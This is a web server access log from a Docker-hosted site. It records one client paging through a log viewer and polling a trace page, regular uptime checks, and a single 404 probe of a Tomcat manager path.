173.48.140.140 - - [19/Dec/2023:04:57:19 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1798 "-" "-" 8001 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:57:19 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3152 "-" "-" 8002 "www@docker" "http://172.18.0.9:80" 35ms
159.203.109.206 - - [19/Dec/2023:04:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8003 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8004 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:04:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8005 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:04:58:22 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8006 "web-to-websecure@internal" "-" 0ms
173.48.140.140 - - [19/Dec/2023:04:58:34 +0000] "GET /logs/ HTTP/2.0" 200 2424 "-" "-" 8007 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:58:34 +0000] "GET /logs/styles.css?version=15 HTTP/2.0" 200 1864 "-" "-" 8008 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:04:58:35 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2876 "-" "-" 8009 "www@docker" "http://172.18.0.9:80" 26ms
167.71.120.76 - - [19/Dec/2023:04:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8010 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:04:58:38 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 3304 "-" "-" 8011 "www@docker" "http://172.18.0.9:80" 20ms
173.48.140.140 - - [19/Dec/2023:04:58:40 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2903 "-" "-" 8012 "www@docker" "http://172.18.0.9:80" 21ms
173.48.140.140 - - [19/Dec/2023:04:58:41 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2842 "-" "-" 8013 "www@docker" "http://172.18.0.9:80" 3096ms
173.48.140.140 - - [19/Dec/2023:04:58:43 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 2753 "-" "-" 8014 "www@docker" "http://172.18.0.9:80" 854ms
173.48.140.140 - - [19/Dec/2023:04:58:46 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 2775 "-" "-" 8015 "www@docker" "http://172.18.0.9:80" 32ms
173.48.140.140 - - [19/Dec/2023:04:58:49 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 3088 "-" "-" 8016 "www@docker" "http://172.18.0.9:80" 46ms
173.48.140.140 - - [19/Dec/2023:04:58:50 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 2824 "-" "-" 8017 "www@docker" "http://172.18.0.9:80" 37ms
173.48.140.140 - - [19/Dec/2023:04:58:52 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 2617 "-" "-" 8018 "www@docker" "http://172.18.0.9:80" 43ms
173.48.140.140 - - [19/Dec/2023:04:58:53 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 2812 "-" "-" 8019 "www@docker" "http://172.18.0.9:80" 49ms
173.48.140.140 - - [19/Dec/2023:04:58:55 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 2920 "-" "-" 8020 "www@docker" "http://172.18.0.9:80" 69ms
173.48.140.140 - - [19/Dec/2023:04:58:56 +0000] "GET /logs/logtail.php?page=11 HTTP/2.0" 200 2765 "-" "-" 8021 "www@docker" "http://172.18.0.9:80" 83ms
173.48.140.140 - - [19/Dec/2023:04:58:57 +0000] "GET /logs/logtail.php?page=12 HTTP/2.0" 200 2866 "-" "-" 8022 "www@docker" "http://172.18.0.9:80" 91ms
173.48.140.140 - - [19/Dec/2023:04:59:00 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3117 "-" "-" 8023 "www@docker" "http://172.18.0.9:80" 22ms
159.203.109.206 - - [19/Dec/2023:04:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8024 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:04:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8025 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:00:18 +0000] "GET /logs/ HTTP/2.0" 200 2508 "-" "-" 8026 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:00:18 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 200 1864 "-" "-" 8027 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:00:18 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3066 "-" "-" 8028 "www@docker" "http://172.18.0.9:80" 23ms
159.203.109.206 - - [19/Dec/2023:05:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8029 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:00:25 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2781 "-" "-" 8030 "www@docker" "http://172.18.0.9:80" 97ms
173.48.140.140 - - [19/Dec/2023:05:00:27 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3015 "-" "-" 8031 "www@docker" "http://172.18.0.9:80" 20ms
173.48.140.140 - - [19/Dec/2023:05:00:30 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2887 "-" "-" 8032 "www@docker" "http://172.18.0.9:80" 24ms
173.48.140.140 - - [19/Dec/2023:05:00:32 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3015 "-" "-" 8033 "www@docker" "http://172.18.0.9:80" 22ms
173.48.140.140 - - [19/Dec/2023:05:00:34 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 2905 "-" "-" 8034 "www@docker" "http://172.18.0.9:80" 20ms
167.71.120.76 - - [19/Dec/2023:05:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8035 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:01:03 +0000] "GET /logs/ HTTP/2.0" 200 2522 "-" "-" 8036 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:01:03 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 8037 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:01:03 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2940 "-" "-" 8038 "www@docker" "http://172.18.0.9:80" 20ms
173.48.140.140 - - [19/Dec/2023:05:01:05 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 3117 "-" "-" 8039 "www@docker" "http://172.18.0.9:80" 17ms
159.203.109.206 - - [19/Dec/2023:05:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8040 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:01:22 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 2876 "-" "-" 8041 "www@docker" "http://172.18.0.9:80" 27ms
173.48.140.140 - - [19/Dec/2023:05:01:24 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 3302 "-" "-" 8042 "www@docker" "http://172.18.0.9:80" 23ms
173.48.140.140 - - [19/Dec/2023:05:01:25 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 2895 "-" "-" 8043 "www@docker" "http://172.18.0.9:80" 27ms
173.48.140.140 - - [19/Dec/2023:05:01:27 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 2842 "-" "-" 8044 "www@docker" "http://172.18.0.9:80" 2053ms
173.48.140.140 - - [19/Dec/2023:05:01:30 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 2753 "-" "-" 8045 "www@docker" "http://172.18.0.9:80" 40ms
173.48.140.140 - - [19/Dec/2023:05:01:31 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 2825 "-" "-" 8046 "www@docker" "http://172.18.0.9:80" 41ms
173.48.140.140 - - [19/Dec/2023:05:01:32 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 3038 "-" "-" 8047 "www@docker" "http://172.18.0.9:80" 47ms
173.48.140.140 - - [19/Dec/2023:05:01:33 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 2848 "-" "-" 8048 "www@docker" "http://172.18.0.9:80" 50ms
173.48.140.140 - - [19/Dec/2023:05:01:33 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 2576 "-" "-" 8049 "www@docker" "http://172.18.0.9:80" 58ms
173.48.140.140 - - [19/Dec/2023:05:01:35 +0000] "GET /logs/logtail.php?page=11 HTTP/2.0" 200 2838 "-" "-" 8050 "www@docker" "http://172.18.0.9:80" 61ms
167.71.120.76 - - [19/Dec/2023:05:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8051 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:01:36 +0000] "GET /logs/logtail.php?page=12 HTTP/2.0" 200 2920 "-" "-" 8052 "www@docker" "http://172.18.0.9:80" 134ms
173.48.140.140 - - [19/Dec/2023:05:01:37 +0000] "GET /logs/logtail.php?page=13 HTTP/2.0" 200 2765 "-" "-" 8053 "www@docker" "http://172.18.0.9:80" 75ms
173.48.140.140 - - [19/Dec/2023:05:01:38 +0000] "GET /logs/logtail.php?page=14 HTTP/2.0" 200 2866 "-" "-" 8054 "www@docker" "http://172.18.0.9:80" 103ms
173.48.140.140 - - [19/Dec/2023:05:01:39 +0000] "GET /logs/logtail.php?page=15 HTTP/2.0" 200 2957 "-" "-" 8055 "www@docker" "http://172.18.0.9:80" 107ms
173.48.140.140 - - [19/Dec/2023:05:01:40 +0000] "GET /logs/logtail.php?page=16 HTTP/2.0" 200 2379 "-" "-" 8056 "www@docker" "http://172.18.0.9:80" 96ms
173.48.140.140 - - [19/Dec/2023:05:01:40 +0000] "GET /logs/logtail.php?page=17 HTTP/2.0" 200 2653 "-" "-" 8057 "www@docker" "http://172.18.0.9:80" 96ms
173.48.140.140 - - [19/Dec/2023:05:01:41 +0000] "GET /logs/logtail.php?page=18 HTTP/2.0" 200 2411 "-" "-" 8058 "www@docker" "http://172.18.0.9:80" 111ms
173.48.140.140 - - [19/Dec/2023:05:01:42 +0000] "GET /logs/logtail.php?page=19 HTTP/2.0" 200 2550 "-" "-" 8059 "www@docker" "http://172.18.0.9:80" 406ms
173.48.140.140 - - [19/Dec/2023:05:01:45 +0000] "GET /logs/logtail.php?page=20 HTTP/2.0" 200 2350 "-" "-" 8060 "www@docker" "http://172.18.0.9:80" 94ms
173.48.140.140 - - [19/Dec/2023:05:01:46 +0000] "GET /logs/logtail.php?page=21 HTTP/2.0" 200 2805 "-" "-" 8061 "www@docker" "http://172.18.0.9:80" 100ms
173.48.140.140 - - [19/Dec/2023:05:01:46 +0000] "GET /logs/logtail.php?page=22 HTTP/2.0" 200 2546 "-" "-" 8062 "www@docker" "http://172.18.0.9:80" 111ms
173.48.140.140 - - [19/Dec/2023:05:01:47 +0000] "GET /logs/logtail.php?page=23 HTTP/2.0" 200 2857 "-" "-" 8063 "www@docker" "http://172.18.0.9:80" 112ms
173.48.140.140 - - [19/Dec/2023:05:01:48 +0000] "GET /logs/logtail.php?page=24 HTTP/2.0" 200 3184 "-" "-" 8064 "www@docker" "http://172.18.0.9:80" 521ms
173.48.140.140 - - [19/Dec/2023:05:01:50 +0000] "GET /logs/logtail.php?page=25 HTTP/2.0" 200 2740 "-" "-" 8065 "www@docker" "http://172.18.0.9:80" 354ms
173.48.140.140 - - [19/Dec/2023:05:01:52 +0000] "GET /logs/logtail.php?page=26 HTTP/2.0" 200 2337 "-" "-" 8066 "www@docker" "http://172.18.0.9:80" 188ms
173.48.140.140 - - [19/Dec/2023:05:01:55 +0000] "GET /logs/logtail.php?page=27 HTTP/2.0" 200 2336 "-" "-" 8067 "www@docker" "http://172.18.0.9:80" 141ms
173.48.140.140 - - [19/Dec/2023:05:01:56 +0000] "GET /logs/logtail.php?page=28 HTTP/2.0" 200 2354 "-" "-" 8068 "www@docker" "http://172.18.0.9:80" 170ms
173.48.140.140 - - [19/Dec/2023:05:01:59 +0000] "GET /logs/logtail.php?page=29 HTTP/2.0" 200 2466 "-" "-" 8069 "www@docker" "http://172.18.0.9:80" 764ms
173.48.140.140 - - [19/Dec/2023:05:02:02 +0000] "GET /logs/logtail.php?page=30 HTTP/2.0" 200 2390 "-" "-" 8070 "www@docker" "http://172.18.0.9:80" 230ms
173.48.140.140 - - [19/Dec/2023:05:02:04 +0000] "GET /logs/logtail.php?page=31 HTTP/2.0" 200 2336 "-" "-" 8071 "www@docker" "http://172.18.0.9:80" 264ms
159.203.109.206 - - [19/Dec/2023:05:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8072 "www@docker" "http://172.18.0.9:80" 20ms
167.71.120.76 - - [19/Dec/2023:05:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8073 "www@docker" "http://172.18.0.9:80" 18ms
137.184.255.50 - - [19/Dec/2023:05:03:09 +0000] "GET /manager/text/list HTTP/1.1" 404 19 "-" "-" 8074 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:05:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8075 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8076 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:03:56 +0000] "GET /logs/ HTTP/2.0" 200 2472 "-" "-" 8077 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:03:56 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 8078 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:03:56 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2941 "-" "-" 8079 "www@docker" "http://172.18.0.9:80" 47ms
173.48.140.140 - - [19/Dec/2023:05:04:00 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2940 "-" "-" 8080 "www@docker" "http://172.18.0.9:80" 20ms
173.48.140.140 - - [19/Dec/2023:05:04:10 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2939 "-" "-" 8081 "www@docker" "http://172.18.0.9:80" 18ms
173.48.140.140 - - [19/Dec/2023:05:04:16 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2938 "-" "-" 8082 "www@docker" "http://172.18.0.9:80" 16ms
173.48.140.140 - - [19/Dec/2023:05:04:19 +0000] "GET /logs/logtail.php?page=1 HTTP/2.0" 200 3144 "-" "-" 8083 "www@docker" "http://172.18.0.9:80" 22ms
173.48.140.140 - - [19/Dec/2023:05:04:20 +0000] "GET /logs/logtail.php?page=2 HTTP/2.0" 200 3062 "-" "-" 8084 "www@docker" "http://172.18.0.9:80" 28ms
159.203.109.206 - - [19/Dec/2023:05:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8085 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:04:22 +0000] "GET /logs/logtail.php?page=3 HTTP/2.0" 200 2940 "-" "-" 8086 "www@docker" "http://172.18.0.9:80" 29ms
173.48.140.140 - - [19/Dec/2023:05:04:22 +0000] "GET /logs/logtail.php?page=4 HTTP/2.0" 200 3117 "-" "-" 8087 "www@docker" "http://172.18.0.9:80" 31ms
173.48.140.140 - - [19/Dec/2023:05:04:24 +0000] "GET /logs/logtail.php?page=5 HTTP/2.0" 200 2881 "-" "-" 8088 "www@docker" "http://172.18.0.9:80" 39ms
173.48.140.140 - - [19/Dec/2023:05:04:26 +0000] "GET /logs/logtail.php?page=6 HTTP/2.0" 200 3302 "-" "-" 8089 "www@docker" "http://172.18.0.9:80" 35ms
173.48.140.140 - - [19/Dec/2023:05:04:28 +0000] "GET /logs/logtail.php?page=7 HTTP/2.0" 200 2887 "-" "-" 8090 "www@docker" "http://172.18.0.9:80" 50ms
173.48.140.140 - - [19/Dec/2023:05:04:30 +0000] "GET /logs/logtail.php?page=8 HTTP/2.0" 200 2821 "-" "-" 8091 "www@docker" "http://172.18.0.9:80" 54ms
173.48.140.140 - - [19/Dec/2023:05:04:32 +0000] "GET /logs/logtail.php?page=9 HTTP/2.0" 200 2753 "-" "-" 8092 "www@docker" "http://172.18.0.9:80" 62ms
173.48.140.140 - - [19/Dec/2023:05:04:33 +0000] "GET /logs/logtail.php?page=10 HTTP/2.0" 200 2825 "-" "-" 8093 "www@docker" "http://172.18.0.9:80" 55ms
173.48.140.140 - - [19/Dec/2023:05:04:34 +0000] "GET /logs/logtail.php?page=11 HTTP/2.0" 200 3038 "-" "-" 8094 "www@docker" "http://172.18.0.9:80" 52ms
167.71.120.76 - - [19/Dec/2023:05:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8095 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:04:36 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 3080 "-" "-" 8096 "www@docker" "http://172.18.0.9:80" 16ms
159.203.109.206 - - [19/Dec/2023:05:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8097 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8098 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:05:06:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 8099 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:05:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8100 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:06:27 +0000] "GET / HTTP/2.0" 304 0 "-" "-" 8101 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:06:27 +0000] "GET /styles.css HTTP/2.0" 304 0 "-" "-" 8102 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8103 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:05:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8104 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8105 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8106 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8107 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8108 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8109 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:10:17 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 8110 "livetrace@docker" "http://172.18.0.3:80" 58ms
173.48.140.140 - - [19/Dec/2023:05:10:17 +0000] "GET /trace/styles.css?version=13 HTTP/2.0" 200 1423 "-" "-" 8111 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [19/Dec/2023:05:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8112 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:10:22 +0000] "GET /trace/ HTTP/2.0" 200 6089 "-" "-" 8113 "livetrace@docker" "http://172.18.0.3:80" 5ms
167.71.120.76 - - [19/Dec/2023:05:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8114 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8115 "www@docker" "http://172.18.0.9:80" 2ms
167.71.120.76 - - [19/Dec/2023:05:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8116 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8117 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8118 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:05:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8119 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:05:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8120 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:13:52 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8121 "livetrace@docker" "http://172.18.0.3:80" 6ms
173.48.140.140 - - [19/Dec/2023:05:13:57 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8122 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:14:02 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8123 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:14:07 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8124 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [19/Dec/2023:05:14:12 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8125 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:14:18 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8126 "livetrace@docker" "http://172.18.0.3:80" 4ms
159.203.109.206 - - [19/Dec/2023:05:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8127 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:14:23 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8128 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:14:28 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8129 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:14:33 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8130 "livetrace@docker" "http://172.18.0.3:80" 3ms
167.71.120.76 - - [19/Dec/2023:05:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8131 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:14:38 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8132 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:14:43 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8133 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:14:48 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8134 "livetrace@docker" "http://172.18.0.3:80" 6ms
173.48.140.140 - - [19/Dec/2023:05:14:53 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8135 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:14:58 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8136 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:15:03 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8137 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [19/Dec/2023:05:15:08 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8138 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:15:13 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8139 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:15:18 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8140 "livetrace@docker" "http://172.18.0.3:80" 5ms
159.203.109.206 - - [19/Dec/2023:05:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8141 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:15:23 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8142 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:15:23 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 200 1422 "-" "-" 8143 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:15:28 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8144 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:15:28 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 304 0 "-" "-" 8145 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:15:33 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8146 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:15:34 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 304 0 "-" "-" 8147 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [19/Dec/2023:05:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 8148 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:15:39 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8149 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:15:39 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 304 0 "-" "-" 8150 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:15:44 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8151 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:15:44 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 304 0 "-" "-" 8152 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:15:49 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8153 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:15:49 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 304 0 "-" "-" 8154 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:15:54 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8155 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [19/Dec/2023:05:15:54 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 200 1401 "-" "-" 8156 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:15:59 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8157 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:15:59 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 304 0 "-" "-" 8158 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [19/Dec/2023:05:16:04 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8159 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:05:16:04 +0000] "GET /trace/styles.css?version=14 HTTP/2.0" 304 0 "-" "-" 8160 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:05:16:09 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8161 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:05:16:09 +0000] "GET /trace/styles.css?version=15 HTTP/2.0" 200 1401 "-" "-" 8162 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:05:16:14 +0000] "GET /trace/ HTTP/2.0" 200 6129 "-" "-" 8163 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [19/Dec/2023:05:16:14 +0000] "GET /trace/styles.css?version=15 HTTP/2.0" 304 0 "-" "-" 8164 "livetrace@docker" "http://172.18.0.3:80" 1ms
